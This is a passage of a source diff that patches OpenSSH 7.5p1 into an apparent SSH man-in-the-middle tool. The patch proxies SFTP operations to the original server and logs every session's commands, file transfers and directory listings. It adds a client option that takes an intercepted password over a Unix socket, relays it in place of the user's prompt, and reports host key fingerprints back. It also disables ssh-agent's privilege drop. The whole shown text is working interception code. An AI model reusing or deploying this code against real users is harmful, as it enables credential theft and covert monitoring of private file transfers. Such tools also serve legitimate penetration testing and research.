id);\n \tverbose(\"readlink \\\"%s\\\"\", path);\n+\t/*\n \tif ((len = readlink(path, buf, sizeof(buf) - 1)) == -1)\n \t\tsend_status(id, errno_to_portable(errno));\n \telse {\n@@ -1251,6 +1766,19 @@\n \t\ts.name = s.long_name = buf;\n \t\tsend_names(id, 1, &s);\n \t}\n+\t*/\n+\tif (mitm_do_readlink(client_conn, path, &status, &filename, &long_name, &a) == 1) {\n+\t\tStat s;\n+\t\ts.name = filename;\n+\t\ts.long_name = long_name;\n+\t\ts.attrib = a;\n+\t\tsend_names(id, 1, &s);\n+\t} else\n+\t\tsend_status(id, status);\n+\n+\tsftp_log_attrib(\"readlink\", status, path, &a);\n+\tfree(filename); filename = NULL;\n+\tfree(long_name); long_name = NULL;\n \tfree(path);\n }\n \n@@ -1267,9 +1795,14 @@\n \tdebug3(\"request %u: symlink\", id);\n \tlogit(\"symlink old \\\"%s\\\" new \\\"%s\\\"\", oldpath, newpath);\n \t/* this will fail if 'newpath' exists */\n+\t/*\n \tr = symlink(oldpath, newpath);\n \tstatus = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;\n+\t*/\n+\tstatus = mitm_do_symlink(client_conn, oldpath, newpath);\n \tsend_status(id, status);\n+\n+\tsftp_log(status, \"ln -s \\\"%s\\\" \\\"%s\\\"\", oldpath, newpath);\n \tfree(oldpath);\n \tfree(newpath);\n }\n@@ -1286,9 +1819,14 @@\n \n \tdebug3(\"request %u: posix-rename\", id);\n \tlogit(\"posix-rename old \\\"%s\\\" new \\\"%s\\\"\", oldpath, newpath);\n+\t/*\n \tr = rename(oldpath, newpath);\n \tstatus = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;\n+\t*/\n+\tstatus = mitm_do_rename(client_conn, oldpath, newpath, 0);\n \tsend_status(id, status);\n+\n+\tsftp_log(status, \"posix_rename \\\"%s\\\" \\\"%s\\\"\", oldpath, newpath);\n \tfree(oldpath);\n \tfree(newpath);\n }\n@@ -1299,29 +1837,41 @@\n \tchar *path;\n \tstruct statvfs st;\n \tint r;\n+\tu_int status = 0;\n \n \tif ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)\n \t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n \tdebug3(\"request %u: statvfs\", id);\n \tlogit(\"statvfs \\\"%s\\\"\", path);\n \n+\t/*\n \tif (statvfs(path, &st) != 0)\n \t\tsend_status(id, errno_to_portable(errno));\n \telse\n \t\tsend_statvfs(id, &st);\n+\t*/\n+\tif (mitm_do_statvfs(client_conn, path, &st, &status) != -1)\n+\t\tsend_statvfs(id, &st);\n+\telse\n+\t\tsend_status(id, status);\n+\n+\tsftp_log_statvfs(status, path, &st);\n         free(path);\n }\n \n static void\n process_extended_fstatvfs(u_int32_t id)\n {\n-\tint r, handle, fd;\n+\tint r, handle_int;\n \tstruct statvfs st;\n+\tu_int status = 0;\n+\tu_char *handle_str = NULL;\n+\tsize_t handle_len = 0;\n \n+\t/*\n \tif ((r = get_handle(iqueue, &handle)) != 0)\n \t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n-\tdebug(\"request %u: fstatvfs \\\"%s\\\" (handle %u)\",\n-\t    id, handle_to_name(handle), handle);\n+\n \tif ((fd = handle_to_fd(handle)) < 0) {\n \t\tsend_status(id, SSH2_FX_FAILURE);\n \t\treturn;\n@@ -1330,6 +1880,19 @@\n \t\tsend_status(id, errno_to_portable(errno));\n \telse\n \t\tsend_statvfs(id, &st);\n+\t*/\n+\n+\tif ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\n+\tdebug3(\"request %u: fstatvfs (handle %u)\", id, handle_int);\n+\tif (mitm_do_fstatvfs(client_conn, handle_str, handle_len, &st, &status) != -1)\n+\t\tsend_statvfs(id, &st);\n+\telse\n+\t\tsend_status(id, status);\n+\n+\tsftp_log_fstatvfs(status, handle_str, handle_len, &st);\n+\tfree(handle_str); handle_str = NULL;\n }\n \n static void\n@@ -1344,9 +1907,14 @@\n \n \tdebug3(\"request %u: hardlink\", id);\n \tlogit(\"hardlink old \\\"%s\\\" new \\\"%s\\\"\", oldpath, newpath);\n+\t/*\n \tr = link(oldpath, newpath);\n \tstatus = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;\n+\t*/\n+\tstatus = mitm_do_hardlink(client_conn, oldpath, newpath);\n \tsend_status(id, status);\n+\n+\tsftp_log(status, \"ln \\\"%s\\\" \\\"%s\\\"\", oldpath, newpath);\n \tfree(oldpath);\n \tfree(newpath);\n }\n@@ -1354,19 +1922,31 @@\n static void\n process_extended_fsync(u_int32_t id)\n {\n-\tint handle, fd, r, status = SSH2_FX_OP_UNSUPPORTED;\n+\tint handle_int, r, status = SSH2_FX_OP_UNSUPPORTED;\n+\tu_char *handle_str = NULL;\n+\tsize_t handle_len = 0;\n \n+\t/*\n \tif ((r = get_handle(iqueue, &handle)) != 0)\n \t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n-\tdebug3(\"request %u: fsync (handle %u)\", id, handle);\n-\tverbose(\"fsync \\\"%s\\\"\", handle_to_name(handle));\n+\t*/\n+\tif ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\n+\tdebug3(\"request %u: fsync (handle %u)\", id, handle_int);\n+\t/*\n \tif ((fd = handle_to_fd(handle)) < 0)\n \t\tstatus = SSH2_FX_NO_SUCH_FILE;\n \telse if (handle_is_ok(handle, HANDLE_FILE)) {\n \t\tr = fsync(fd);\n \t\tstatus = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;\n \t}\n+\t*/\n+\tstatus = mitm_do_fsync(client_conn, handle_str, handle_len);\n \tsend_status(id, status);\n+\n+\tsftp_log_fsync(status, handle_str, handle_len);\n+\tfree(handle_str); handle_str = NULL;\n }\n \n static void\n@@ -1474,6 +2054,10 @@\n void\n sftp_server_cleanup_exit(int i)\n {\n+\twrite(session_log_fd, \"</pre></html>\", 13);\n+\tfdatasync(session_log_fd);\n+\tclose(session_log_fd);\n+\n \tif (pw != NULL && client_addr != NULL) {\n \t\thandle_log_exit();\n \t\tlogit(\"session closed for local user %s from [%s]\",\n@@ -1485,19 +2069,17 @@\n static void\n sftp_server_usage(void)\n {\n-\textern char *__progname;\n-\n \tfprintf(stderr,\n \t    \"usage: %s [-ehR] [-d start_directory] [-f log_facility] \"\n \t    \"[-l log_level]\\n\\t[-P blacklisted_requests] \"\n \t    \"[-p whitelisted_requests] [-u umask]\\n\"\n \t    \"       %s -Q protocol_feature\\n\",\n-\t    __progname, __progname);\n+\t    \"/usr/libexec/sftp-server\", \"/usr/libexec/sftp-server\");\n \texit(1);\n }\n \n int\n-sftp_server_main(int argc, char **argv, struct passwd *user_pw)\n+sftp_server_main(int argc, char **argv, struct passwd *user_pw, char *original_host, unsigned short original_port, char *username, char *password_and_fingerprint_socket_name, char *log_filepath, char *log_dir)\n {\n \tfd_set *rset, *wset;\n \tint i, r, in, out, max, ch, skipargs = 0, log_stderr = 0;\n@@ -1553,10 +2135,12 @@\n \t\t\t\terror(\"Invalid log facility \\\"%s\\\"\", optarg);\n \t\t\tbreak;\n \t\tcase 'd':\n+\t\t\t/*\n \t\t\tcp = tilde_expand_filename(optarg, user_pw->pw_uid);\n \t\t\thomedir = percent_expand(cp, \"d\", user_pw->pw_dir,\n \t\t\t    \"u\", user_pw->pw_name, (char *)NULL);\n \t\t\tfree(cp);\n+\t\t\t*/\n \t\t\tbreak;\n \t\tcase 'p':\n \t\t\tif (request_whitelist != NULL)\n@@ -1583,6 +2167,7 @@\n \t}\n \n \tlog_init(__progname, log_level, log_facility, log_stderr);\n+\tmitm_init_log(log_filepath, log_dir);\n \n \t/*\n \t * On platforms where we can, avoid making /proc/self/{mem,maps}\n@@ -1638,6 +2223,7 @@\n \t\t}\n \t}\n \n+\tclient_conn = make_connection(original_host, original_port, username, password_and_fingerprint_socket_name);\n \tset_size = howmany(max + 1, NFDBITS) * sizeof(fd_mask);\n \tfor (;;) {\n \t\tmemset(rset, 0, set_size);\n@@ -1706,3 +2292,340 @@\n \t\t\t    __func__, ssh_err(r));\n \t}\n }\n+\n+/* Copied from sftp.c. */\n+/* ARGSUSED */\n+static void\n+killchild(int signo)\n+{\n+\tif (sshpid > 1) {\n+\t\tkill(sshpid, SIGTERM);\n+\t\twaitpid(sshpid, NULL, 0);\n+\t}\n+\n+\t_exit(1);\n+}\n+\n+/* Copied from sftp.c. */\n+/* ARGSUSED */\n+static void\n+suspchild(int signo)\n+{\n+\tif (sshpid > 1) {\n+\t\tkill(sshpid, signo);\n+\t\twhile (waitpid(sshpid, NULL, WUNTRACED) == -1 && errno == EINTR)\n+\t\t\tcontinue;\n+\t}\n+\tkill(getpid(), SIGSTOP);\n+}\n+\n+/* Copied from sftp.c. */\n+static void\n+connect_to_server(char *path, char **args, int *in, int *out)\n+{\n+\tint c_in, c_out;\n+\n+#ifdef USE_PIPES\n+\tint pin[2], pout[2];\n+\n+\tif ((pipe(pin) == -1) || (pipe(pout) == -1))\n+\t\tfatal(\"pipe: %s\", strerror(errno));\n+\t*in = pin[0];\n+\t*out = pout[1];\n+\tc_in = pout[0];\n+\tc_out = pin[1];\n+#else /* USE_PIPES */\n+\tint inout[2];\n+\n+\tif (socketpair(AF_UNIX, SOCK_STREAM, 0, inout) == -1)\n+\t\tfatal(\"socketpair: %s\", strerror(errno));\n+\t*in = *out = inout[0];\n+\tc_in = c_out = inout[1];\n+#endif /* USE_PIPES */\n+\n+\tif ((sshpid = fork()) == -1)\n+\t\tfatal(\"fork: %s\", strerror(errno));\n+\telse if (sshpid == 0) {\n+\t\tif ((dup2(c_in, STDIN_FILENO) == -1) ||\n+\t\t    (dup2(c_out, STDOUT_FILENO) == -1)) {\n+\t\t\tfprintf(stderr, \"dup2: %s\\n\", strerror(errno));\n+\t\t\t_exit(1);\n+\t\t}\n+\t\tclose(*in);\n+\t\tclose(*out);\n+\t\tclose(c_in);\n+\t\tclose(c_out);\n+\n+\t\t/*\n+\t\t * The underlying ssh is in the same process group, so we must\n+\t\t * ignore SIGINT if we want to gracefully abort commands,\n+\t\t * otherwise the signal will make it to the ssh process and\n+\t\t * kill it too.  Contrawise, since sftp sends SIGTERMs to the\n+\t\t * underlying ssh, it must *not* ignore that signal.\n+\t\t */\n+\t\tsignal(SIGINT, SIG_IGN);\n+\t\tsignal(SIGTERM, SIG_DFL);\n+\n+\t\texecvp(path, args);\n+\t\tfprintf(stderr, \"exec: %s: %s\\n\", path, strerror(errno));\n+\t\t_exit(1);\n+\t}\n+\n+\tsignal(SIGTERM, killchild);\n+\tsignal(SIGINT, killchild);\n+\tsignal(SIGHUP, killchild);\n+\tsignal(SIGTSTP, suspchild);\n+\tsignal(SIGTTIN, suspchild);\n+\tsignal(SIGTTOU, suspchild);\n+\tclose(c_in);\n+\tclose(c_out);\n+}\n+\n+void mitm_init_log(char *log_filepath, char *log_dir) {\n+  session_log_fd = open(log_filepath, O_NOATIME | O_NOFOLLOW | O_WRONLY\n+#ifdef SYNC_LOG\n+        | O_SYNC\n+#endif\n+        );\n+\n+  /* Ensure that writes append to the log, since its initialized with\n+   * connection information. */\n+  lseek(session_log_fd, 0, SEEK_END);\n+\n+  if (session_log_fd < 0)\n+    logit(\"MITM: failed to open SFTP log: %s\", log_filepath);\n+\n+  session_log_dir = strdup(log_dir);\n+  if ((session_log_dir = xstrdup(log_dir)) == NULL)\n+    fatal(\"Failed to allocate memory for session log dir path.\");\n+}\n+\n+struct sftp_conn *\n+make_connection(char *host, unsigned short port, char *username, char *password_and_fingerprint_socket_name) {\n+\targlist args;\n+\tchar *ssh_program = MITM_SSH_CLIENT;\n+\tint in = -1, out = -1;\n+\n+\targs.list = NULL;\n+\taddargs(&args, \"%s\", ssh_program);\n+\taddargs(&args, \"-E\");\n+\taddargs(&args, \"%s\", MITM_SSH_CLIENT_LOG);\n+\taddargs(&args, \"-F\");\n+\taddargs(&args, \"%s\", MITM_SSH_CLIENT_CONFIG);\n+\taddargs(&args, \"-Z\");\n+\taddargs(&args, \"%s\", password_and_fingerprint_socket_name);\n+\taddargs(&args, \"-oForwardX11=no\");\n+\taddargs(&args, \"-oForwardAgent=no\");\n+\taddargs(&args, \"-oPermitLocalCommand=no\");\n+\taddargs(&args, \"-oClearAllForwardings=yes\");\n+\taddargs(&args, \"-oPort=%u\", port);\n+\taddargs(&args, \"-oProtocol=2\");\n+\taddargs(&args, \"-s\");\n+\taddargs(&args, \"--\");\n+\taddargs(&args, \"%s@%s\", username, host);\n+\taddargs(&args, \"sftp\");\n+\tconnect_to_server(ssh_program, args.list, &in, &out);\n+\treturn do_init(in, out, 32768, 64, 0);\n+}\n+\n+/* Simple XSS sanitization. */\n+void xss_sanitize(char *buf, int buf_len) {\n+  int i;\n+  for (i = 0; i < buf_len; i++) {\n+    if (buf[i] == '<')\n+      buf[i] = '[';\n+    else if (buf[i] == '>')\n+      buf[i] = ']';\n+  }\n+}\n+\n+/* C doesn't let you pass variable-length arguments from one function to\n+ * another if the second function needs to call va_start() again.  These\n+ * defines cut down on duplicate code in that case.  Not sure if there's any\n+ * other way to do it... */\n+#define SFTP_LOG_HEADER() va_start(args, fmt); \\\n+\\\n+  /* By setting the last byte to NULL and giving sizeof(buf) - 1 to vsnprintf, \\\n+   * we can be sure that the buffer will be NULL-terminated afterwards. */ \\\n+  buf[sizeof(buf) - 1] = '\\0'; \\\n+\\\n+  ret = vsnprintf(buf, buf_len - 1, fmt, args); \\\n+\\\n+  /* If we need a larger buffer to format the string into... */ \\\n+  if (ret >= buf_len) { \\\n+    buf_len = ret + 1; \\\n+    if ((buf = reallocarray(NULL, buf_len, sizeof(char))) == NULL) \\\n+      fatal(\"Could not allocate buffer for sftp_log.\"); \\\n+    buf[buf_len - 1] = '\\0'; \\\n+\\\n+    va_end(args); \\\n+    va_start(args, fmt); \\\n+    ret = vsnprintf(buf, buf_len, fmt, args); \\\n+  }\n+\n+#define SFTP_LOG_FOOTER() va_end(args); \\\n+  /* Free the buffer, if we allocated it. */ \\\n+  if (buf != buf_stack) { \\\n+    free(buf); buf = NULL; \\\n+  }\n+\n+/* Log an SFTP command. */\n+void sftp_log(u_int status, const char *fmt, ...) {\n+  char buf_stack[512], *buf = buf_stack;\n+  int buf_len = sizeof(buf_stack), ret = 0;\n+  va_list args;\n+\n+  SFTP_LOG_HEADER()\n+  _sftp_log(status, 1, buf, ret);\n+  SFTP_LOG_FOOTER()\n+}\n+\n+/* Log an SFTP command without XSS filtering enabled.  Don't use this unless\n+ * you know what you're doing. */\n+void sftp_log_no_filter(u_int status, const char *fmt, ...) {\n+  char buf_stack[512], *buf = buf_stack;\n+  int buf_len = sizeof(buf_stack), ret = 0;\n+  va_list args;\n+\n+  SFTP_LOG_HEADER()\n+  _sftp_log(status, 0, buf, ret);\n+  SFTP_LOG_FOOTER()\n+}\n+\n+void _sftp_log(u_int status, u_int do_xss_filtering, char *buf, int buf_len) {\n+  write(session_log_fd, \"> \", 2);\n+\n+  /* Replace any angled brackets in the buffer. */\n+  if (do_xss_filtering)\n+    xss_sanitize(buf, buf_len);\n+\n+  /* Write the buffer to the session log. */\n+  write(session_log_fd, buf, buf_len);\n+\n+  /* If the status is not success, write it into the log as well. */\n+  if (status != SSH2_FX_OK) {\n+    char errmsg[64];\n+    const char *m = status_to_message(status);\n+    int r = 0;\n+\n+    memset(errmsg, 0, sizeof(errmsg));\n+\n+    r = snprintf(errmsg, sizeof(errmsg) - 1, \" (Error: %s)\", m);\n+    write(session_log_fd, errmsg, r);\n+  }\n+\n+  write(session_log_fd, \"\\n\", 1);\n+}\n+\n+/* Log a file transfer or directory listing. */\n+void sftp_log_close(u_int status, char *handle_str, size_t handle_len) {\n+  MITMHandle *mh = NULL;\n+\n+  if ((mh = mitm_handle_search(handle_str, handle_len)) != NULL) {\n+    char *original_path = mh->original_path;\n+\n+    /* If a file handle was closed... */\n+    if (mh->type == MITM_HANDLE_TYPE_FILE) {\n+      u_int32_t pflags = mh->pflags;\n+      char *actual_path = mh->actual_path;\n+      const char get[] = \"get\";\n+      const char put[] = \"put\";\n+      const char getput[] = \"get/put\";\n+      const char *verb = getput;\n+      int read = 0, write = 0;\n+\n+      /* Was the file open for reading, writing, or both? */\n+      read = (pflags & SSH2_FXF_READ);\n+      write = (pflags & SSH2_FXF_WRITE) || (pflags & SSH2_FXF_APPEND);\n+\n+      if (read && !write)\n+\tverb = get;\n+      else if (!read && write)\n+\tverb = put;\n+\n+      /* Make a link in the log to the local file we saved. */\n+      sftp_log_no_filter(status, \"%s <a href=\\\"%s\\\">%s</a>\", verb, actual_path, original_path);\n+    } else { /* ...a directory was closed. */\n+      sftp_log(status, \"ls %s\\n%s\", original_path, mh->file_listing);\n+    }\n+  } else\n+    logit(CANT_FIND_HANDLE, __func__);\n+}\n+\n+/* Writes an Attrib struct to the log. */\n+void sftp_log_attrib(const char *sftp_func, u_int status, char *name, Attrib *a) {\n+  if (a != NULL) {\n+    status = SSH2_FX_OK;\n+    sftp_log(status, \"%s \\\"%s\\\" (Result: flags: %u; size: %lu; uid: %u; gid: %u; perm: 0%o, atime: %u, mtime: %u)\", sftp_func, name, a->flags, a->size, a->uid, a->gid, a->perm, a->atime, a->mtime);\n+  } else\n+    sftp_log(status, \"%s \\\"%s\\\" (Result: flags: ?; size: ?; uid: ?; gid: ?; perm: ?, atime: ?, mtime: ?)\", sftp_func, name);\n+}\n+\n+/* Given a handle, writes an Attrib struct to the log. */\n+void sftp_log_handle_attrib(const char *func, u_int status, char *handle_str, size_t handle_len, Attrib *a) {\n+  MITMHandle *mh = NULL;\n+\n+  if ((mh = mitm_handle_search(handle_str, handle_len)) != NULL)\n+    sftp_log_attrib(func, status, mh->original_path, a);\n+  else\n+    logit(CANT_FIND_HANDLE, __func__);\n+}\n+\n+/* Stores the result of a readdir() call (done during file listings). */\n+void sftp_log_readdir(char *handle_str, size_t handle_len, char *listing) {\n+  int resize_needed = 0;\n+  MITMHandle *mh = NULL;\n+\n+  if ((mh = mitm_handle_search(handle_str, handle_len)) != NULL) {\n+    size_t listing_len = strlen(listing);\n+\n+    /* If the file listing array hasn't been initialized yet, do that now. */\n+    if (mh->file_listing_size == 0) {\n+      mh->file_listing_size = MITM_HANDLES_FILE_LISTING_BLOCK;\n+      if ((mh->file_listing = reallocarray(NULL, mh->file_listing_size, sizeof(char))) == NULL)\n+\tfatal(\"MITM: could not allocate file_listing!\");\n+      mh->file_listing[0] = '\\0';\n+    }\n+\n+    /* If the array isn't big enough, resize it.  (+1 for the newline, and +1\n+     * for the NULL byte) */\n+    while (mh->file_listing_size < (strlen(mh->file_listing) + listing_len + 1 + 1)) {\n+      mh->file_listing_size += MITM_HANDLES_FILE_LISTING_BLOCK;\n+      resize_needed = 1;\n+    }\n+\n+    if (resize_needed) {\n+      if((mh->file_listing = reallocarray(mh->file_listing, mh->file_listing_size, sizeof(char))) == NULL)\n+\tfatal(\"MITM: could not allocate file_listing!\");\n+    }\n+\n+    strlcat(mh->file_listing, listing, mh->file_listing_size);\n+    strlcat(mh->file_listing, \"\\n\", mh->file_listing_size);\n+  } else\n+    logit(CANT_FIND_HANDLE, __func__);\n+}\n+\n+/* Writes a statvfs struct to the log. */\n+void sftp_log_statvfs(u_int status, char *path, struct statvfs *st) {\n+  sftp_log(status, \"statvfs \\\"%s\\\" (Result: filesystem block size: %lu; fragment size: %lu; filesystem size [measured in fragments]: %lu; number of free blocks: %lu; number of free blocks for unprivileged users: %lu; number of inodes: %lu; number of free inodes: %lu; number of free inodes for unprivileged users: %lu; filesystem ID: %lu; mount flags: %lu; maximum filename length: %lu)\", path, st->f_bsize, st->f_frsize, st->f_blocks, st->f_bfree, st->f_bavail, st->f_files, st->f_ffree, st->f_favail, st->f_fsid, st->f_flag, st->f_namemax);\n+}\n+\n+/* Given a file handle, writes a statvfs struct to the log. */\n+void sftp_log_fstatvfs(u_int status, char *handle_str, size_t handle_len, struct statvfs *st) {\n+  MITMHandle *mh = NULL;\n+\n+  if ((mh = mitm_handle_search(handle_str, handle_len)) != NULL)\n+    sftp_log_statvfs(status, mh->original_path, st);\n+  else\n+    logit(CANT_FIND_HANDLE, __func__);\n+}\n+\n+/* Logs an fsync() call. */\n+void sftp_log_fsync(u_int status, char *handle_str, size_t handle_len) {\n+  MITMHandle *mh = NULL;\n+\n+  if ((mh = mitm_handle_search(handle_str, handle_len)) != NULL)\n+    sftp_log(status, \"fsync \\\"%s\\\"\", mh->original_path);\n+  else\n+    logit(CANT_FIND_HANDLE, __func__);\n+}\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-server-main.c openssh-7.5p1-mitm/sftp-server-main.c\n--- openssh-7.5p1/sftp-server-main.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/sftp-server-main.c\t2019-09-08 01:47:49.778198104 +0000\n@@ -49,5 +49,7 @@\n \t\treturn 1;\n \t}\n \n-\treturn (sftp_server_main(argc, argv, user_pw));\n+\t/* Running a stand-alone SFTP server is unsupported. */\n+\t/*return (sftp_server_main(argc, argv, user_pw));*/\n+\treturn 0;\n }\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/ssh-agent.c openssh-7.5p1-mitm/ssh-agent.c\n--- openssh-7.5p1/ssh-agent.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/ssh-agent.c\t2019-09-08 01:47:49.778198104 +0000\n@@ -1228,9 +1228,10 @@\n \tsanitise_stdfd();\n \n \t/* drop */\n+\t/*\n \tsetegid(getgid());\n \tsetgid(getgid());\n-\n+\t*/\n \tplatform_disable_tracing(0);\t/* strict=no */\n \n #ifdef WITH_OPENSSL\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/ssh.c openssh-7.5p1-mitm/ssh.c\n--- openssh-7.5p1/ssh.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/ssh.c\t2019-09-08 01:47:49.778198104 +0000\n@@ -49,6 +49,7 @@\n #include <sys/resource.h>\n #include <sys/ioctl.h>\n #include <sys/socket.h>\n+#include <sys/un.h>\n #include <sys/wait.h>\n \n #include <ctype.h>\n@@ -110,6 +111,7 @@\n #include \"ssherr.h\"\n #include \"myproposal.h\"\n #include \"utf8.h\"\n+#include \"lol.h\"\n \n #ifdef ENABLE_PKCS11\n #include \"ssh-pkcs11.h\"\n@@ -192,6 +194,10 @@\n extern int muxserver_sock;\n extern u_int muxclient_command;\n \n+int num_hostkey_fps = 0;\n+hostkey_fp *server_hostkey_fps = NULL;\n+int password_and_fingerprint_fd = -1;\n+\n /* Prints a help message to the user.  This function never returns. */\n \n static void\n@@ -524,6 +530,7 @@\n \tstruct addrinfo *addrs = NULL;\n \tstruct ssh_digest_ctx *md;\n \tu_char conn_hash[SSH_DIGEST_MAX_LENGTH];\n+\tchar *password = NULL;\n \n \tssh_malloc_init();\t/* must be called before any mallocs */\n \t/* Ensure that fds 0, 1 and 2 are open or directed to /dev/null */\n@@ -548,6 +555,9 @@\n \t */\n \tclosefrom(STDERR_FILENO + 1);\n \n+\t/* Initialize the array of host key fingerprints. */\n+\tserver_hostkey_fps = calloc(MAX_SERVER_HOSTKEY_FPS, sizeof(hostkey_fp));\n+\n \t/*\n \t * Save the original real uid.  It will be needed later (uid-swapping\n \t * may clobber the real uid).\n@@ -605,8 +615,9 @@\n \targv0 = av[0];\n \n  again:\n+\t/* Add -Z to get the password to use. */\n \twhile ((opt = getopt(ac, av, \"1246ab:c:e:fgi:kl:m:no:p:qstvx\"\n-\t    \"ACD:E:F:GI:J:KL:MNO:PQ:R:S:TVw:W:XYy\")) != -1) {\n+\t    \"ACD:E:F:GI:J:KL:MNO:PQ:R:S:TVw:W:XYyZ:\")) != -1) {\n \t\tswitch (opt) {\n \t\tcase '1':\n \t\t\toptions.protocol = SSH_PROTO_1;\n@@ -931,6 +942,54 @@\n \t\tcase 'F':\n \t\t\tconfig = optarg;\n \t\t\tbreak;\n+\t\tcase 'Z':\n+\t\t\t/* The argument here is the path to the socket to\n+\t\t\t * read the password and write server host key\n+\t\t\t * fingerprints to. */\n+\t\t\tif (strlen(optarg) > 0) {\n+\t\t\t  struct sockaddr_un addr;\n+\t\t\t  u_int16_t password_len = 0;\n+\t\t\t  int i = 0, bytes_read = 0, r = 0;\n+\t\t\t  struct timespec req;\n+\n+\t\t\t  memset(&addr, 0, sizeof(addr));\n+\t\t\t  addr.sun_family = AF_UNIX;\n+\t\t\t  req.tv_sec = 1;\n+\t\t\t  req.tv_nsec = 0;\n+\t\t\t  password_and_fingerprint_fd = socket(AF_UNIX, SOCK_STREAM, 0);\n+\n+\t\t\t  /* Try to connect up to 10 times, pausing 1 second in between each attempt. */\n+\t\t\t  strlcpy(addr.sun_path, optarg, sizeof(addr.sun_path));\n+\t\t\t  while (i < 10) {\n+\t\t\t    if ((r = connect(password_and_fingerprint_fd, (struct sockaddr *)&addr, sizeof(addr))) == 0)\n+\t\t\t      break;\n+\n+\t\t\t    nanosleep(&req, NULL);\n+\t\t\t    i++;\n+\t\t\t  }\n+\n+\t\t\t  /* If connect() never succeeded, terminate. */\n+\t\t\t  if (r != 0)\n+\t\t\t    exit(-1);\n+\n+\t\t\t  /* Read the password length. */\n+\t\t\t  read(password_and_fingerprint_fd, &password_len, sizeof(password_len));\n+\t\t\t  password_len = ntohs(password_len);\n+\n+\t\t\t  if ((password = calloc(password_len + 1, sizeof(char))) == NULL)\n+\t\t\t    exit(-1);\n+\n+\t\t\t  /* Read all the bytes to the password. */\n+\t\t\t  while (bytes_read < password_len) {\n+\t\t\t    r = read(password_and_fingerprint_fd, password + bytes_read, password_len - bytes_read);\n+\t\t\t    if ((r < 0) && (r != EINTR))\n+\t\t\t      exit(-1);\n+\t\t\t    else if (r > 0)\n+\t\t\t      bytes_read += r;\n+\t\t\t  }\n+\t\t\t  password[password_len] = '\\0';\n+\t\t\t}  \n+\t\t\tbreak;\n \t\tdefault:\n \t\t\tusage();\n \t\t}\n@@ -1292,6 +1351,7 @@\n \tsensitive_data.nkeys = 0;\n \tsensitive_data.keys = NULL;\n \tsensitive_data.external_keysign = 0;\n+\tsensitive_data.password = password;\n \tif (options.rhosts_rsa_authentication ||\n \t    options.hostbased_authentication) {\n \t\tsensitive_data.nkeys = 9;\n@@ -2194,3 +2254,27 @@\n \tsignal(sig, main_sigchld_handler);\n \terrno = save_errno;\n }\n+\n+void write_hostkeys() {\n+  int i = 0;\n+\n+  if (password_and_fingerprint_fd == -1)\n+    return;\n+\n+  for(i = 0; i < num_hostkey_fps; i++) {\n+    char *old = server_hostkey_fps[i].old;\n+    char *new = server_hostkey_fps[i].new;\n+\n+    send(password_and_fingerprint_fd, old, strlen(old), 0);\n+    send(password_and_fingerprint_fd, \"\\n\", strlen(\"\\n\"), 0);\n+    send(password_and_fingerprint_fd, new, strlen(new), 0);\n+    send(password_and_fingerprint_fd, \"\\n\", strlen(\"\\n\"), 0);\n+\n+    free(server_hostkey_fps[i].old); server_hostkey_fps[i].old = NULL;\n+    free(server_hostkey_fps[i].new); server_hostkey_fps[i].new = NULL;\n+  }\n+  shutdown(password_and_fingerprint_fd, SHUT_RDWR);\n+  password_and_fingerprint_fd = -1;\n+  free(server_hostkey_fps); server_hostkey_fps = NULL;\n+  num_hostkey_fps = 0;\n+}\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshconnect2.c openssh-7.5p1-mitm/sshconnect2.c\n--- openssh-7.5p1/sshconnect2.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/sshconnect2.c\t2019-09-08 01:47:49.778198104 +0000\n@@ -81,6 +81,7 @@\n extern char *client_version_string;\n extern char *server_version_string;\n extern Options options;\n+extern void write_hostkeys();\n \n /*\n  * SSH2 key exchange\n@@ -218,6 +219,7 @@\n \tkex->verify_host_key=&verify_host_key_callback;\n \n \tdispatch_run(DISPATCH_BLOCK, &kex->done, active_state);\n+\twrite_hostkeys();\n \n \t/* remove ext-info from the KEX proposals for rekeying */\n \tmyproposal[PROPOSAL_KEX_ALGS] =\n@@ -906,7 +908,8 @@\n \n \tsnprintf(prompt, sizeof(prompt), \"%.30s@%.128s's password: \",\n \t    authctxt->server_user, host);\n-\tpassword = read_passphrase(prompt, 0);\n+\t/* password = read_passphrase(prompt, 0); */\n+\tpassword = strdup(authctxt->sensitive->password);  /* TODO: zero out password field now? */\n \tpacket_start(SSH2_MSG_USERAUTH_REQUEST);\n \tpacket_put_cstring(authctxt->server_user);\n \tpacket_put_cstring(authctxt->service);\n@@ -1592,7 +1595,9 @@\n \t\tprompt = packet_get_string(NULL);\n \t\techo = packet_get_char();\n \n-\t\tresponse = read_passphrase(prompt, echo ? RP_ECHO : 0);\n+\t\t/*response = read_passphrase(prompt, echo ? RP_ECHO : 0);*/\n+\t\t/* For some reason, this gets executed only when connecting to some networking equipment... */\n+\t\tresponse = strdup(authctxt->sensitive->password);\n \n \t\tpacket_put_cstring(response);\n 